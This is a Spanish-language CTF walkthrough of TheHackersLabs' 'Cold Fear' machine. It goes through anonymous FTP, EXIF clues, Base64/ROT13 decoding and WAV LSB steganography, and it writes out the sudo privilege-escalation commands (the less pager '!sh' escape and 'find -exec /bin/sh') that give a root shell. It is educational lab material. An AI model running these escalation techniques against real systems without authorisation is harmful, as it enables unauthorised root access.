---
tags: [ctf, thehackerslabs, linux, walkthrough]
tipo: walkthrough
estado: resuelto
---

# Cold Fear — Walkthrough

> [!note] Cómo leer esta nota
> **comando → salida relevante → interpretación → por qué**. Salidas marcadas *(reconstrucción)* vienen del roadmap de estudio.

## Paso 1 — FTP anónimo

**Comando**
```bash
ftp 192.168.56.143      # usuario: anonymous / (vacío)
# o:
curl -s ftp://anonymous:anonymous@192.168.56.143/
```

**Salida relevante** *(reconstrucción)*
```text
bitacora-01.txt
```

**Interpretación / por qué**
- FTP anónimo es un acceso sin credenciales que suele contener pistas; se prueba **antes** que la fuerza bruta.

## Paso 2 — Bitácora y usuario `tripulanteX`

**Comando**
```bash
get bitacora-01.txt
cat bitacora-01.txt
```

**Interpretación / por qué**
- El fichero menciona al usuario `tripulanteX`, dando un nombre válido para la cadena.

## Paso 3 — EXIF de la imagen → `/var/log/bridge/` → Boris

**Comando**
```bash
curl -s http://192.168.56.143/bridge-cam.jpg -o bridge-cam.jpg
file bridge-cam.jpg
exiftool bridge-cam.jpg
# y comparar con una versión "limpia" si existe
```

**Interpretación / por qué**
- Los **metadatos EXIF** (y la comparación de la imagen con otra) revelan la ruta `/var/log/bridge/` y pistas sobre **Boris**. No basta con ver la foto: hay que leer sus metadatos.

## Paso 4 — Base64 + ROT13 → Sergei

**Comando**
```bash
echo '<cadena>' | base64 -d
# resultado en ROT13:
echo '<texto_rot13>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**Interpretación / por qué**
- Decodificación en **cadena**: primero Base64, luego ROT13. Aplicar en el orden correcto desvela las pistas de **Sergei**.

## Paso 5 — LSB del WAV → Victor

**Comando**
```bash
# Extraer los 2 bits LSB de cada muestra PCM
python3 - <<'PY'
import wave
w = wave.open('archivo.wav','rb')
data = w.readframes(w.getnframes())
bits = ''.join(str(b & 0b11) for b in data)   # 2 bits LSB por muestra
# reconstruir bytes y buscar el mensaje
PY
```

**Interpretación / por qué**
- La esteganografía en audio **PCM** oculta datos en los bits menos significativos. Se reconstruye extrayendo 2 bits LSB por muestra.

## Paso 6 — `sudo aws help` → escape del pager → Anna

**Comando**
```bash
sudo -l
sudo aws help          # abre el pager `less`
# dentro de less:
!sh
```

**Interpretación / por qué**
- Un programa permitido en `sudo` que invoca un **pager** (`less`) hereda privilegios. Desde `less`, `!sh` lanza shell como el usuario del `sudo`. Ver [[GTFOBins]].

## Paso 7 — Patrón de tres sesiones → Mikhail

**Interpretación / por qué**
- La pista describe un **patrón de tres sesiones**; la contraseña se **reconstruye** a partir del patrón, no se crackea.

## Paso 8 — `sudo find -exec` → root

**Comando**
```bash
sudo -l
sudo find . -exec /bin/sh \; -quit
id
```

**Salida relevante** *(reconstrucción)*
```text
uid=0(root) gid=0(root)
```

**Interpretación / por qué**
- `find` con `-exec` como el usuario del `sudo` ejecuta comandos arbitrarios → root. Ver [[Sudo-Find-Exec]].

## Qué funcionó

- Encadenar **EXIF + comparación de imagen**.
- Detectar y reconstruir **Base64 → ROT13**.
- Extraer **LSB de audio PCM**.
- Escapes de **GTFOBins** (`less`, `find`).

## Qué falló (y por qué)

- Pruebas de esteganografía/decodificación descartadas (ver [[Cold Fear - Lecciones]]).

## Qué aprendí

- Los metadatos y el audio son vectores de información.
- `sudo` + pager + `-exec` son escapes clásicos.
